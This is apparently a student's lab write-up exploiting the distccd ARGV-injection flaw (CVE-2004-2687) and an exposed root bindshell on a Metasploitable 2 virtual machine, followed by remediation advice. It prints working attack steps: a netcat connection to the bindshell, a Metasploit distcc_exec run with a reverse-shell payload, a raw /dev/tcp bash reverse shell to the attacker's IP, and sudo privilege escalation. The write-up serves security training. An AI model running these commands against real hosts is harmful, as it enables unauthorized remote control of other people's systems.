# distccd — Remote Code Execution

## Vulnerability Overview

| Field             | Details                                  |
|-------------------|------------------------------------------|
| **CVE**           | CVE-2004-2687                            |
| **Service**       | distccd (distcc daemon)                  |
| **Port**          | 3632/tcp                                 |
| **Severity**      | 🔴 Critical                              |
| **Version**       | distccd v1 (GCC 4.2.4)                  |
| **MSF Module**    | `exploit/unix/misc/distcc_exec`          |
| **Payload**       | `cmd/unix/reverse`                       |
| **Auth Required** | ❌ None                                  |
| **CVSS Score**    | 9.3 (Critical)                           |

---

## Environment

| Role     | OS               | IP Address       |
|----------|------------------|------------------|
| Attacker | Kali Linux       | 192.168.133.129  |
| Target   | Metasploitable 2 | 192.168.133.128  |

---

## Background

### What is distccd?

**distcc** is a distributed C/C++ compiler system that speeds up large software compilations by distributing build jobs across multiple machines on a network. **distccd** is its background daemon that listens for incoming compilation requests — typically on **port 3632**.

It is commonly used in development environments and build farms to parallelize compilation workloads.

| Use Case          | Description                                          |
|-------------------|------------------------------------------------------|
| Build Acceleration | Distribute compile jobs across multiple machines    |
| CI/CD Pipelines   | Speed up automated build systems                     |
| Developer Farms   | Shared compilation infrastructure across teams       |
| Cross-compilation | Compile for a different target architecture remotely |

### Port

| Port    | Protocol | Purpose                          |
|---------|----------|----------------------------------|
| 3632    | TCP      | distccd compilation job listener |

---

## Vulnerability — Unauthenticated RCE via ARGV Injection

distccd v1 was designed for **trusted internal networks** and has **no authentication mechanism** whatsoever. When exposed to untrusted networks, it blindly accepts and executes compilation jobs from any host.

An attacker abuses this by embedding **arbitrary shell commands** inside a specially crafted compilation request using the `ARGV` command — the daemon passes these directly to execution without any sanitization.

```
Attacker → sends malicious "compile job" → distccd executes it
           with the privileges of the daemon user
```

The daemon runs commands as whatever user it was started under — often `daemon`, `nobody`, or a developer account.

- **Affected Versions:** distcc < 3.0 (roughly)
- **Impact:** Unauthenticated Remote Code Execution

---

## Step 1 — Reconnaissance (Nmap Scan)

Nmap scan identified port 3632 running distccd, and critically, port **1524** as an exposed **Metasploitable root shell**:

```
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
1524/tcp  open  bindshell   Metasploitable root shell
```

> ⚠️ Port **1524** exposes a raw root shell — accessible directly via `netcat` with zero authentication required.

---

## Step 2 — Direct Root Access via Bindshell (Port 1524)

Before launching any exploit, a **direct root shell** was obtained by connecting to the exposed bindshell on port 1524:

```bash
nc 192.168.133.128 1524
```

```
root@metasploitable:/# whoami
root
```

✅ **Instant root shell — no exploit, no credentials, no payload.**

> Port 1524 is a raw root shell listener intentionally exposed on Metasploitable 2. A single `nc` command is all it takes. This represents one of the most severe misconfigurations possible on any networked system.

---

## Step 3 — Loading the Exploit (Metasploit)

The distccd vulnerability was also exploited independently via Metasploit:

```bash
msfconsole
msf > use exploit/unix/misc/distcc_exec
msf exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
msf exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.133.128
msf exploit(unix/misc/distcc_exec) > set LHOST 192.168.133.129
msf exploit(unix/misc/distcc_exec) > exploit
```

**Exploit output:**

```
[*] Started reverse TCP handler on 192.168.133.129:4444
[*] Command shell session 1 opened (192.168.133.129:4444 → 192.168.133.128:...)
```

✅ **Reverse shell obtained.**

---

## Step 4 — Manual Reverse Shell (Without Metasploit)

The same result can be achieved by injecting a raw bash reverse shell through the distccd service:

```bash
# Payload embedded in a malicious compile job sent to distccd
sh -i >& /dev/tcp/192.168.133.129/4444 0>&1
```

Start a listener on the attacker machine before sending:

```bash
nc -lvnp 4444
```

---

## Step 5 — Post-Exploitation

### OS & Credential Information

```bash
cat /etc/issue
```

```
Metasploitable 2 - Build 6
Login with msfadmin/msfadmin to get started
```

**Credentials found:**

| Username   | Password   |
|------------|------------|
| `msfadmin` | `msfadmin` |

### Running Processes

```bash
ps aux
```

Enumerated all running processes to identify active services, daemons, and potential privilege escalation vectors.

### Privilege Escalation Check

```bash
sudo -l
```

```
User daemon may run the following commands on this host:
    (ALL) ALL
```

🔴 **Critical Misconfiguration:** Unrestricted `sudo` — full root access without a password.

```bash
sudo su
whoami
# root
```

✅ **Full root access confirmed.**

---

## What a Hacker Can Do

### 1. Remote Code Execution (RCE)
Execute arbitrary OS commands on the target without any credentials by abusing the distccd ARGV injection flaw.

### 2. Reverse Shell
Establish an interactive shell session back to the attacker's machine — giving full command-line control of the target.

### 3. Privilege Escalation
Once inside as `daemon`, escalate to `root` via:
- Misconfigured SUID binaries
- Unrestricted `sudo` rules
- Kernel exploits (old unpatched systems running distccd v1 are prime candidates)

### 4. Lateral Movement
Use the compromised machine as a pivot point to reach other internal systems — distccd machines are often on internal build networks with broad trust relationships.

### 5. Data Exfiltration
Access source code, credentials, SSH keys, config files, and any readable data on the filesystem.

---

## Attack Flow Summary

```
Nmap scan            →  Port 3632 open (distccd) + Port 1524 open (Bindshell)
       ↓
nc 192.168.133.128 1524  →  Instant root shell via bindshell ✅
       ↓
Load MSF module      →  exploit/unix/misc/distcc_exec
       ↓
Set payload          →  cmd/unix/reverse
       ↓
Run exploit          →  Reverse shell opened ✅
       ↓
cat /etc/issue       →  Credentials: msfadmin/msfadmin
       
```

---

## Impact

- **Instant root via bindshell** (port 1524) — single `nc` command, zero authentication
- **Unauthenticated RCE** via distccd ARGV injection — no credentials needed
- Full filesystem read/write/delete access
- Credential and SSH key harvesting
- Persistent backdoor installation
- Lateral movement and network pivoting
- Complete system compromise via two independent attack vectors

---

## Remediation

| Action                          | Details                                                                   |
|---------------------------------|---------------------------------------------------------------------------|
| **Update distcc**               | Upgrade to distcc 3.0 or later                                            |
| **Firewall port 3632**          | Block distccd from all untrusted/external networks                        |
| **Use `--allow` flag**          | Restrict distccd to specific trusted IP ranges only                       |
| **Close port 1524**             | This bindshell must never be exposed; firewall or terminate the service   |
| **Principle of least privilege**| distccd should never run with unrestricted sudo privileges                |
| **Network segmentation**        | Isolate build infrastructure from the general network                     |
| **Monitor for anomalies**       | Alert on unexpected outbound connections from build machines              |

---

## What I Learned

- How distcc works and why exposing port 3632 to untrusted networks is dangerous
- The ARGV injection flaw — distccd executes embedded shell commands without sanitization
- No authentication + network exposure = trivial unauthenticated RCE
- Port 1524 as an exposed bindshell grants instant root with a single `nc` command
- Two completely independent root vectors can exist simultaneously on the same target
- Using `cmd/unix/reverse` payload for a reverse shell via Metasploit
- Extracting credentials from `/etc/issue` and system files
- Using `sudo -l` to identify privilege escalation opportunities

---

## References

- [CVE-2004-2687 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [Rapid7 — distcc_exec Module](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/)
- [Exploit-DB #9915](https://www.exploit-db.com/exploits/9915)
- [CyLab Academy](https://learn.cylabacademy.org/)
